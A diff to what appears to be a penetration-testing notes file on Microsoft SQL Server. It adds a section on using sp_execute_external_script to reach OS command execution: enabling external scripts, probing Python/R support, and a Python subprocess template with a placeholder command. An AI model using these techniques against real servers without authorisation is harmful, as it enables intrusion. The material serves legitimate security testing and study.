@@ -485,7 +485,7 @@ msf> use exploit/windows/mssql/mssql_linkcrawler
 
 ### OS commands execution
 
-#### xp_cmdshell
+#### `xp_cmdshell` procedure
 
 The `xp_cmdshell` extended procedure can be used to execute system commands
 given that the account making the queries has sufficient privileges on the SQL
@@ -752,6 +752,85 @@ def shell():
 
 shell()
 sys.exit()
+```
+
+#### `sp_execute_external_script` procedure
+
+Introduced in `SQL Server 2016 (13.x)` and `Azure SQL Managed Instance`, the
+`sp_execute_external_script` procedure can be used to execute scripts written
+in a number of supported language (`Python`, `R`, or `Java`). The `external
+scripts enabled` option, off by default, must be set and the language supported
+by the server to allow external scripts execution of a given language.
+
+In `SQL Server 2016 (13.x)`, only the `R` language is supported. Starting
+from `SQL Server 2017  (14.x)`, the installation of the `Machine Learning
+Services` feature may result in the activation of the `external scripts
+enabled` option and the support of the `Python` and / or `R` languages.
+Additionally, for `SQL Server 2019 (15.x)` and later, support for the
+`Java` language can be configured directly through the `Machine Learning
+Services` feature.
+
+###### `sp_execute_external_script` activation and languages support
+
+The following query can be used to manually activate the
+`sp_execute_external_script` procedure, given the account used has sufficient
+privilege:
+
+```sql
+-- Returns 1 if the "external scripts enabled" option is enabled.
+EXECUTE sp_configure  'external scripts enabled'
+
+-- Enables the "external scripts enabled" option.
+EXEC sp_configure 'external scripts enabled', 1;
+GO
+RECONFIGURE WITH OVERRIDE;
+GO
+```
+
+The following queries can be used to test whether the `Python` / `R` languages
+are supported:
+
+```sql
+-- Source : https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/external-scripts-enabled-server-configuration-option?view=sql-server-ver15
+
+-- Returns "supported 1" if the `Python` language is supported.
+EXEC sp_execute_external_script  @language =N'Python',
+@script=N'
+OutputDataSet = InputDataSet;
+',
+@input_data_1 =N'SELECT 1 AS supported'
+WITH RESULT SETS (([hello] int not null));
+GO
+
+-- Returns "supported 1" if the `Python` language is supported.
+EXEC sp_execute_external_script  @language =N'R',
+@script=N'
+OutputDataSet <- InputDataSet;
+',
+@input_data_1 =N'SELECT 1 AS supported'
+WITH RESULT SETS (([hello] int not null));
+GO
+```
+
+###### Operating System commands execution through `sp_execute_external_script`
+
+If the prerequisites are satisfied, script of any supported language can be
+executed using the `sp_execute_external_script` procedure:
+
+```sql
+-- sp_execute_external_script  procedure basic usage.
+EXEC sp_execute_external_script
+    @language = N'<Python | R | LANGUAGE>',
+    @script = N'<SCRIPT>'
+GO
+
+-- Example call to sp_execute_external_script to execute OS command with output using Python.
+EXEC sp_execute_external_script @language = N'Python' , @script = N'
+import subprocess;
+a = subprocess.check_output(["<OS_COMMAND>"], shell=True).decode();
+print(a);
+'
+GO
 ```
 
 #### SQL Server Agent
